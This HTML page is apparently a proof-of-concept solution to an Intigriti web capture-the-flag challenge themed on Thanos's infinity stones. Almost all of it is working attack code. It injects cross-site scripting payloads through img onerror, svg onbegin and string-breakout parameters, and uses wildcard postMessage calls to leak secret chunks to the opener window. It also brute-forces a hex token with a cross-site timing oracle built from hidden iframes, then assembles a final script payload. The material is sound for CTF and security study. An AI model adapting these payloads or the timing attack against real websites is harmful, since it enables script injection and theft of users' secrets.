<!DOCTYPE html>
<html lang="en">
<head>
    <title>Thanos Infinity Stones Test</title>
</head>
<body>
    <p>Balancing the universe... please wait</p>
    <script>
        let chunks = {};
        const baseUrl = 'https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced';

        // Injections for subdomain vulns to leak chunks via postMessage to opener (this window)
        const params = new URLSearchParams();
        params.set('mind', '<img src onerror="opener.postMessage({stone:\'mind\',chunk:mindStone},\'*\')">');
        params.set('reality', '<img src onerror="opener.postMessage({stone:\'reality\',chunk:decodeURIComponent(document.querySelector(\'textarea\').value)},\'*\')">');
        params.set('action', 'opener.postMessage({stone:\'reality\',chunk:decodeURIComponent(document.querySelector(\'textarea\').value)},\'*\')');
        params.set('soul', '" ; opener.postMessage({stone:\'soul\',chunk:soulStone},\'*\') ; //');
        params.set('space', '<svg><animatetransform onbegin="opener.postMessage({stone:\'space\',chunk:document.getElementById(\'space\').shadowRoot.querySelector(\'p\').textContent},\'*\')">');

        const challengeUrl = `${baseUrl}?${params.toString()}`;

        // Open the main as popup
        const popup = window.open(challengeUrl, 'thanos', 'width=1000,height=800');

        // Listener for leaked chunks from subdomains
        window.addEventListener('message', (event) => {
            if (event.data && event.data.stone && event.data.chunk.length === 8) {
                chunks[event.data.stone] = event.data.chunk;
                if (Object.keys(chunks).length === 6) {
                    // Assemble in order: power, mind, reality, space, soul, time
                    const fullCode = chunks.power + chunks.mind + chunks.reality + chunks.space + chunks.soul + chunks.time;
                    popup.postMessage(fullCode + 'alert(1)', '*');
                }
            }
        });

        // Leak Power (using soul injection to send message to power iframe)
        // Add to soul param: ` ; parent.document.querySelector('[src^= "https://power"]').contentWindow.postMessage('&lt;script&gt;opener.postMessage({stone:"power",chunk:power_stone_data},"*")&lt;/script&gt;','*') ; `

        // Leak Time (timing oracle in this PoC)
        async function leakTimeChunk() {
            let chunk = '';
            for (let i = 0; i < 8; i++) {
                let minDuration = Infinity;
                let bestHex = '';
                for (let hex = 0; hex < 16; hex++) {
                    let guess = chunk + hex.toString(16);
                    let totalDuration = 0;
                    for (let trial = 0; trial < 10; trial++) {
                        let iframe = document.createElement('iframe');
                        iframe.style.display = 'none';
                        iframe.src = `https://time.challenge-1225.intigriti.io/search?q=${guess}`;
                        document.body.appendChild(iframe);
                        await new Promise(resolve => iframe.onload = resolve);
                        let entry = performance.getEntriesByName(iframe.src)[0];
                        totalDuration += entry.duration;
                        document.body.removeChild(iframe);
                    }
                    let avgDuration = totalDuration / 10;
                    if (avgDuration < minDuration) {
                        minDuration = avgDuration;
                        bestHex = hex.toString(16);
                    }
                }
                chunk += bestHex;
            }
            chunks.time = chunk;
        }

        // Run the time leak after popup opens (give time for cookie set)
        setTimeout(leakTimeChunk, 1000);  // Adjust timing if needed

        // For Power, the soul injection extension sends the entity payload to power, executing the leak
    </script>
</body>
</html>
